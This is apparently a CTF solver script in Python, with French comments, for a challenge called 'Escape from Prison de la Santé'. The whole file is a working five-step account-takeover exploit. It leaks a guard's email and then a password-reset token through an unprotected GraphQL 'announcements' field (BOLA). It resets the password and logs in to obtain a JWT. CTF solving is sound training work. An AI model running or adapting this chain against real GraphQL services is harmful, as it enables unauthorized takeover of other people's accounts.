#!/usr/bin/env python3
"""
step1.py — Escape from "Prison de la Santé"
ATO du compte gardien b.bellick via GraphQL BOLA + reset de mot de passe.

Chaîne :
  1. Query publique `announcements { author { email } }` → e-mail de Bellick
  2. POST /api/auth/forgot-password → génère le token en base de données
  3. Query publique `announcements { author { token } }` → lecture du token (BOLA)
  4. POST /api/auth/reset-password → nouveau mot de passe
  5. POST /api/auth/login → JWT gardien

Usage :
  python3 step1.py --target http://challenge.ctf:PORT
"""

import argparse
import sys

import requests

NEW_PASSWORD = "CTFsolve_2026!"


def gql(session, target, query):
    resp = session.post(
        f"{target}/graphql",
        json={"query": query},
        headers={"Content-Type": "application/json"},
        timeout=15,
    )
    resp.raise_for_status()
    data = resp.json()
    if "errors" in data:
        raise RuntimeError(f"GraphQL error: {data['errors']}")
    return data["data"]


def step1_get_email(session, target):
    print("[1/5] BOLA — récupération de l'e-mail du gardien via announcements")
    data = gql(session, target, '{ announcements { author { username email } } }')
    for ann in data["announcements"]:
        author = ann["author"]
        if author.get("email") and author["email"].endswith("@administration.penitentiaire-sante.fr"):
            print(f"      Trouvé : {author['username']} <{author['email']}>")
            return author["username"], author["email"]
    raise RuntimeError("Aucun e-mail de gardien trouvé dans les annonces")


def step2_trigger_forgot_password(session, target, email):
    print(f"[2/5] Forgot-password → génération du token pour {email}")
    resp = session.post(
        f"{target}/api/auth/forgot-password",
        json={"email": email},
        timeout=10,
    )
    resp.raise_for_status()
    print(f"      Réponse : {resp.json().get('message', '')}")


def step3_get_token(session, target, username):
    print("[3/5] BOLA — lecture du token de réinitialisation via announcements")
    data = gql(session, target, '{ announcements { author { username token } } }')
    for ann in data["announcements"]:
        author = ann["author"]
        if author.get("username") == username and author.get("token"):
            print(f"      Token : {author['token']}")
            return author["token"]
    raise RuntimeError("Token introuvable — vérifier que forgot-password a bien été appelé")


def step4_reset_password(session, target, token):
    print(f"[4/5] Reset du mot de passe avec le token")
    resp = session.post(
        f"{target}/api/auth/reset-password",
        json={"token": token, "newPassword": NEW_PASSWORD},
        timeout=10,
    )
    resp.raise_for_status()
    j = resp.json()
    if not j.get("success"):
        raise RuntimeError(f"Reset échoué : {j}")
    print(f"      Nouveau mot de passe : {NEW_PASSWORD}")


def step5_login(session, target, username):
    print(f"[5/5] Connexion en tant que {username}")
    resp = session.post(
        f"{target}/api/auth/login",
        json={"username": username, "password": NEW_PASSWORD},
        timeout=10,
    )
    resp.raise_for_status()
    j = resp.json()
    if "token" not in j:
        raise RuntimeError(f"Login échoué : {j}")
    jwt = j["token"]
    print(f"      JWT (gardien) : {jwt[:48]}…")
    return jwt


def main():
    parser = argparse.ArgumentParser(description="Step 1 — ATO du compte gardien")
    parser.add_argument("--target", required=True, help="URL du challenge, ex. http://10.0.0.1:3000")
    args = parser.parse_args()
    target = args.target.rstrip("/")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (CTF Solver)"})

    print(f"[*] Cible : {target}\n")

    username, email = step1_get_email(session, target)
    step2_trigger_forgot_password(session, target, email)
    token = step3_get_token(session, target, username)
    step4_reset_password(session, target, token)
    jwt = step5_login(session, target, username)

    print(f"\n[+] Compte {username} compromis.")
    print(f"[+] JWT gardien : {jwt}")


if __name__ == "__main__":
    main()
